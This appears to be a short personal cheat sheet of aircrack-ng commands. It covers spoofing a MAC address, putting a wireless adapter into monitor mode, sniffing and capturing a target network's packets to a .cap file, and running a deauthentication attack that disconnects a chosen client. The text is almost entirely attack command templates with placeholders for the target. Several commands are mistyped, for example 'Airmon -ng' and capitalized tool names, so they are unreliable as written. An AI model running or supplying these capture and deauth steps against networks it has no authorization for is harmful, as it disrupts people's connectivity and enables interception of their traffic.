NOTE1 : For testing, it's better to use a wireless adapter 
NOTE2 : The phrases that don't contain any special characters besides -.. are the actual commands. Between the
_.._ are the instructions of what should be written each time

CHANGE A MAC ADDRESS
STEP 1 : Disable the mac address
    Ifconfig _interface_ down 
STEP 2: Change it ( make sure it starts with 00 )
	Ifconfig _interface_ _the_segment_for_change_ _to|what_
STEP 3: Enable the mac address
	Ifconfig _interface_ up
	
	
CHANGE MODE 
STEP 1: Disable the mac address
	Ifconfig _interface_ down
STEP 2: Kill any process that is currently running.
	Airmon -ng check kill ( write it as it is ) 
STEP 3: Change the mode
	Iwconfig _interface_ mode _monitor|managed_   
STEP 4: Enable the mac address
	Ifconfig _interface_ up
	
	
PACHET SNIFFING
(For that we need to be in monitor mode )

WAY 1 : Against all wireless networks ( catches all packets ) 
	Airodump-ng __the interface that is in monitor mode__ 
WAY 2:  Against all networks that also use the 5GH frequencies
	Airodump-ng --band a  _interface_ 
WAY3: It writes the packets in a file ( we're interested in the .cap file )
	Airodump-ng  --bssid  _bssid|target_ --channel _chanel_ --write _where|store_ _interfacename_ 
	
DISCONNECT A DEVICE FROM A NETWORK 

Aireplay-ng --deauth  100000000000 -a  _mac|address_ -c   _clientToDisc_ ( -D if the target is in 5gh) _interface_
